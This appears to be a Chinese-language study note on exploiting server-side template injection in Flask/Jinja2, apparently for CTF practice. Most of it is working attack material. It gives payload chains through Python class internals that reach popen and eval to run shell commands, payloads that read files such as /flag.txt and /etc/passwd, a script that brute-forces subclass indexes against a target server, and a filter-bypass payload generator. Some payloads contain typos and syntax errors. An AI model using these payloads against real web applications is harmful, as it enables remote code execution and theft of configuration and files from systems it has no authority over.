## 简介：
Flask 渲染模板的方法有 `render_template()`，通过这个方法，我们可以渲染一个指定的文件：
```
return render_template('index.html');
```

也可以通过 `render_template_string` 来渲染一个指定的字符串
```
html='This is index page'
return render_template_string(html);
```

### 引擎特点：
![[Pasted image 20240427215154.png]]

也就是说，我们的引擎中，可以通过对应的装载变量，来让我们能够把我们的对应的内容显示到我们的前端当中。

这个时候，我们在**解析我们的对应的变量的时候**，遵循下面的规则：
1. 我们先将我们的输入的元素**进行一次 eval**
2. 然后将我们的 eval 后得到的结果，**转换为字符串**，
3. 将我们得到的字符串**显示到前端**。

可以看见，我们的模板注入漏洞能够被使用，当且仅当我们存在一个**二次渲染**。所谓的二次渲染，也就是我们在渲染我们的模板前，已经把我们的对应位置设定为了我们之前的某一个参数，例如：
![[Pasted image 20240427220044.png]]

这个时候，我们如果让我们的 str 为一条特定的攻击语句，那莪我们就可以实现我们的 **RCE**。具体来说，我们可以在这里写上一个新的 `{{}}` 结构，从而可以让我们执行我们的 `{{}}` 结构内的内容，而不是我们的其他内容。
## 测试漏洞:
```
{{4*4}}
[[5*5]]
{{7*'7'}}---》7777777
{{config.items()}}
```



## 构造思路：
第零步：我们希望通过我们的元素找到我们的对应的 python 版本


我们的构造思路是：在我们的内部，通过一次代码执行，找到我们的对应的 flask 注入，我们对于我们的这一次代码执行，存在下面的要求：
1. 我们通过一次执行，我们的起始环境是一个什么都没有的 python 环境
2. 我们的代码不能换行，只能通过一行**链式操作**来完成我们的对应的 flask 注入

同时注意一些语法细节：有些时候我们得到的元素是一个**元组**，而不是一个类，我们需要通过取对应的元素来得到我们的对应的结果。

为此，我们需要使用到我们的 python 当中的大量**魔术方法**，我们对应的内容在我们的 python 相关基础中有对应阐述，这里我们只阐述几个常见的思路：
1. 找到我们的 python 当中的 file 类，通过 file 类中的对应的 write 函数，read 函数来得到对应的内容：或者通过我们的 system 模块中的 open 函数
```python
{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(file类对应的下标)('/flag.txt').read()}}
```
2. 通过我们的 python 当中导入我们的 os 模块，通过使用 os 模块中的 popen+指令名+read 或者通过我们的 os 模块+system 方法+指令名来执行，我们取**搜索含有 popen 方法的类即可**
```python
"".__class__.__bases__[0].__subclasses__()[161].__init__.__globals__['popen']('whoami').read()
```

4. 通过我们找到所有类当中的一个子类，其中的全局方法中含有 builtins 这个方法，然后再通过 builtins 去调用我们的 eval 方法，来执行我们的对应的函数。我们对应苏**搜索__builtins__这个类就行了**

```python
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}
```

4. 通过我们的 import 方法，导入我们的一些系统自带的库，然后通过这一个库来得到我们的最终结果。






## 找到相关类：
### 方法一：本地跑：
```
search = 'popen' #可以替换为任何你需要的函数,或者类
num = -1
for i in ().__class__.__bases__[0].__subclasses__():
    num += 1
    try:
        if search in i.__init__.__globals__.keys():
            print(i, num)
    except:
        pass
```

### 方法二：连对方靶机跑：
```
import requests
import time
import html
for i in range(0,300):
    time.sleep(0.06)
    payload="{{().__class__.__mro__[-1].__subclasses__()[%s]}}" % i
    url='http://ip:5000?name='
    r = requests.post(url+payload)
    if "catch_warnings" in r.text:
        print(r.text)
        print(i)
        break 
```

## 常见payload：
```
1. 读取config信息
{{config}}
{% for key,value in config.items()%}
<dt>{{key|e}}</dt>
<dd>{{key|e}}</dd>
{% endfor%}
```

```
2. 文件读取
{{[].__class__.__bases__[0].__subclasses__()[40]('/etc/password').read()}}

{{config.items()[4][1].__class__.__base__[0].__subclasses__()[40]("/tmp/flag").read()}}
```

```
3.命令执行
[].__class__.__base__[0].__subclasses__()[50]__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()')
```

```
4.动态执行：
{% for x in ().__class__.__base__[0].__subclasses__()%}
{% if "warning" in x.__name__%}{
x().__module__.__builtins__['__import__']('os').popen(你要执行的指令).read()}}{% endif%}{%endfor%}
}
```

![[Pasted image 20240427223629.png]]

## 通杀模板：
```
    arg_globals = "(dict(request|attr('args'))|attr('pop'))('1')"
    arg_builtins = "(dict(request|attr('args'))|attr('pop'))('2')"
    arg_import = "(dict(request|attr('args'))|attr('pop'))('3')"
    arg_os = "(dict(request|attr('args'))|attr('pop'))('4')"
    arg_popen = "(dict(request|attr('args'))|attr('pop'))('5')"
    arg_cmd = "(dict(request|attr('args'))|attr('pop'))('6')"

    glo = "(lipsum|attr(%s))"%(arg_globals)
    buil = "((%s|attr(%s))(%s))"%(glo,arg_getitem,arg_builtins)
    impo_os = "(((%s|attr(%s))(%s))(%s))"%(buil,arg_getitem,arg_import,arg_os)
    popen = "((%s|attr(%s)))"%(impo_os,arg_popen)
    popen_cmd = "(%s(%s))"%(popen,arg_cmd)
    read = "(%s|attr('read'))()"%popen_cmd
    s = "{%%print(%s)%%}"%(read)

    print(s)
```